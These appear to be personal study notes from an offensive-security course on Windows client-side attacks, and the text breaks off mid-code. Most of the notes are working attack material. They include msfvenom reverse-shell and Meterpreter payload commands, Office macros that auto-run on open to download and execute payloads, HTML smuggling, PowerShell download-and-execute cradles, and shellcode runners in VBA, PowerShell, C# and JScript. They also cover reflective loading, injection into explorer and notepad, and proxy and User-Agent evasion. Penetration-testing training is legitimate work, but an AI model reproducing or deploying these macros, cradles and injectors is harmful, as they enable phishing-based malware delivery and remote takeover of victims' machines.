# Client Side Code Execution With Office

```bash
nc -nvlp 444
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o shell.exe
```

## Meterpreter Handler

```bash
msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
```

```bash
msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.49.52;set LPORT 53;set AutoRunScript post/windows/manage/migrate;run;"
```

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfnonstaged.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfstaged.exe
```

## HTML Smuggling

### smuggling.html

HTML5 anchor tag **download** attribute instructs the browser to automatically download a file when a user clicks the assigned hyperlink.

```html
<html>
    <body>
      <a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a>
   </body>
</html>
```

```html
<html>
    <body>
        <script>
          function base64ToArrayBuffer(base64) {
    		  var binary_string = window.atob(base64);
    		  var len = binary_string.length;
    		  var bytes = new Uint8Array( len );
    		  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    		  return bytes.buffer;
      		}
      		
			/* msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfstaged.exe
			base64 msfstaged.exe */
      		var file ='TVqQAAMAAAAEAAAA...'
      		var data = base64ToArrayBuffer(file);
      		var blob = new Blob([data], {type: 'octet/stream'});
      		var fileName = 'msfstaged.exe';
      		
			// Google Chrome
      		var a = document.createElement('a');
      		document.body.appendChild(a);
      		a.style = 'display: none';
      		var url = window.URL.createObjectURL(blob);
      		a.href = url;
      		a.download = fileName;
      		a.click();
      		window.URL.revokeObjectURL(url);
			
			// Microsoft Edge
			// window.navigator.msSaveBlob(blob, filename);
        </script>
    </body>
</html>
```

## Phishing with Microsoft Office

Save our document in a Macro-Enabled format such as `.doc` or `.docm`. The newer `.docx` will not store macros.

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide
    'CreateObject("Wscript.Shell").Run str, 0
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

## Phishing PreTexting

1. With the text created, mark it and navigate to `Insert > Quick Parts > AutoTexts` and `Save Selection to AutoText Gallery`

2. In the **Create New Building Block** dialog box, enter the name "TheDoc"

```VB
Sub Document_Open()
    SubstitutePage
End Sub

Sub AutoOpen()
    SubstitutePage
End Sub

Sub SubstitutePage()
    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
End Sub
```

## VBA Shellcode Runner

Meterpreter Handler (x86)

```bash
msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
```

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
```

```VB
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, ...)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Porting Shellcode Runner to PowerShell

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

```bat
powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))
```

### run.txt

```pwsh
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
	[DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...
$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

```VB
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Reflection Shellcode Runner in PowerShell

### run2.txt

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

```bat
powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run2.txt'))
```

```pwsh
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

## PowerShell Proxy-Aware Communication

View the proxy settings

```pwsh
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1")
```

Remove proxy settings by simply creating an empty object

```pwsh
$wc = new-object system.net.WebClient
$wc.proxy = $null
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

In some environments, network communications not going through the proxy will get blocked at an edge firewall.

## Fiddling With The User-Agent

The `Net.WebClient` PowerShell download cradle does not have a default User-Agent set => The session will stand out from other legitimate traffic.

Customize User-Agent

```pwsh
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...")
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

## Give Me A SYSTEM Proxy

* -s: run it as SYSTEM
* -i: make it interactive with the current desktop

```bat
PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
```

A PowerShell download cradle running in **SYSTEM** integrity level context does not have a proxy configuration set and may fail to call back to our C2 infrastructure.

=> Create a proxy configuration for the built-in SYSTEM account, i.e., copy a configuration from a standard user account.

Proxy settings for each user are stored in the registry at 
`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings`

When navigating the registry, the **HKEY_CURRENT_USER** registry hive is mapped according to the user trying to access it, but when navigating the registry as SYSTEM, no such registry hive exists.

The **HKEY_USERS** registry hive always exists and contains the content of all user HKEY_CURRENT_USER registry hives split by their respective SIDs. => Map the HKEY_USERS registry hive with the **New-PSDrive**

Any SID starting with "**S-1-5-21-**" is a user account exclusive of built-in accounts.

```pwsh
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer

[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.119.120/run2.ps1")
```

# Client Side Code Execution With Windows Script Host

The default application for `.js` files is the Windows-Based Script Host

## Jscript Meterpreter Dropper

### run.js

```js
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

Modify the Jscript code to make it proxy-aware with the **setProxy** method

### run2.js

```js
var url = "http://192.168.119.120/shell.exe"
var Object = WScript.CreateObject("MSXML2.ServerXMLHTTP");
Object.setProxy(2, "192.168.X.12:3128", "")

Object.open('GET', url, false);
Object.send();

if (Object.status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.responseBody);
    Stream.Position = 0;

    Stream.SaveToFile("shell.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("shell.exe");
```

## Shellcode Runner in C#

Create a Kali Samba share for our code

```bash
sudo apt install samba
sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
sudo nano /etc/samba/smb.conf
```

`smb.conf`
```
[visualstudio]
 path = /home/kali/data
 browseable = yes
 read only = no
```

```bash
sudo smbpasswd -a kali

sudo systemctl start smbd
sudo systemctl start nmbd

mkdir /home/kali/data
chmod -R 777 /home/kali/data
```

```csharp
using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

### Shellcode Parameter

```csharp
using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
                return;
            }

            string url = "http://" + args[0] + "/" + args[1];

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Download the file content as a string directly into memory
                    string declaration = client.GetStringAsync(url).Result; // Blocking call
                    declaration = declaration.Trim();

                    // Use a regex to extract the byte values
                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);

                    if (match.Success)
                    {
                        string byteValues = match.Groups[1].Value;
                        string[] hexArray = byteValues.Split(',');

                        // Create the byte array with the dynamic size based on the number of hex values
                        byte[] buf = new byte[hexArray.Length];

                        for (int i = 0; i < hexArray.Length; i++)
                        {
                            // Convert each hex string to a byte
                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
                        }

                        int size = buf.Length;

                        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

                        Marshal.Copy(buf, 0, addr, size);

                        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                    }
                    else
                    {
                        Console.WriteLine("The file does not contain a valid byte array declaration.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading file: {ex.Message}");
            }
        }
    }
}
```

## Jscript Shellcode Runner

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {
		//MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);

		// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
        byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
	}

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

```bat
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```

## SharpShooter

SharpShooter is "a payload creation framework for the retrieval and execution of arbitrary C# source code". SharpShooter is capable of evading various types of security software.

`https://github.com/mdsecactivebreach/SharpShooter`

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o shell.txt
```

```bash
sharpshooter --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
```

## Reflective Load

```csharp
using System;
using System.Runtime.InteropServices;


namespace ReflectiveLoad
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

```pwsh
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/ReflectiveLoad.dll', 'C:\Users\Offsec\ReflectiveLoad.dll')
$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ReflectiveLoad.dll")
```

```pwsh
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ReflectiveLoad.dll')
$assem = [System.Reflection.Assembly]::Load($data)

$class = $assem.GetType("ReflectiveLoad.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

# Process Injection and Migration

## Process Injection in C#

Process injection with VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread is considered a standard technique, ...

### VirtualAllocEx and WriteProcessMemory

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            Process[] expProc = Process.GetProcessesByName("explorer");

            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            IntPtr outSize;

            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```

The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.

### NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessInjection2
{
    class Program
    {
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

		[DllImport("kernel32.dll")]
		static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();

		[DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
		static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes,	ref uint MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern uint NtMapViewOfSection(IntPtr SectionHandle,	IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits,	UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize,	uint InheritDisposition, uint AllocationType, uint Win32Protect);
	
		[DllImport("ntdll.dll", SetLastError = true)]
		static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
		static extern int NtClose(IntPtr hObject);

		static void Main(string[] args)
        {
			// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

			uint buffer_size = (uint)buf.Length;

			// Create the section handle.
			IntPtr ptr_section_handle = IntPtr.Zero;
			UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);
			if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
				return;

			// Map a view of a section into the virtual address space of the current process.
			ulong section_offset = 0;
			IntPtr ptr_local_section_addr = IntPtr.Zero;
			UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, (UIntPtr)(long)IntPtr.Zero, (UIntPtr)(long)IntPtr.Zero, out section_offset, out buffer_size, 0x2, 0, 0x04);
			if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
				return;

			// Copy the shellcode into the mapped section.
			Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);

			// Map a view of the section in the virtual address space of the targeted process.
			Process[] expProc = Process.GetProcessesByName("explorer");
			int pid = expProc[0].Id;
			IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
			IntPtr ptr_remote_section_addr = IntPtr.Zero;
			uint remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, (UIntPtr)(long)IntPtr.Zero, (UIntPtr)(long)IntPtr.Zero, out section_offset, out buffer_size, 0x2, 0, 0x20);
			if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
				return;

			// Unmap the view of the section from the current process & close the handle.
			NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
			NtClose(ptr_section_handle);
			CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
		}
    }
}
```

## Process Injection in PowerShell

### run3.txt

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

```bat
powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run3.txt'))
```

```pwsh
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$id = (Start-Process Notepad -passthru -WindowStyle hidden).ID

$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [Bool], [Int]) ([IntPtr]))).Invoke(0x001F0FFF, $false, $id)
        
$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
     
$outSize = 0
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int32], [Int].MakeByRefType()) ([Bool]))).Invoke($hProcess, $addr, $buf, $buf.length, [ref] $outSize)
#[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int32], [Int].MakeByRefType()) ([Bool]))).Invoke($hProcess, $addr, $buf, $buf.length, [ref] 0)
       
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
```

## DLL Injection with C#

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o met.dll
```

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace DLLInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
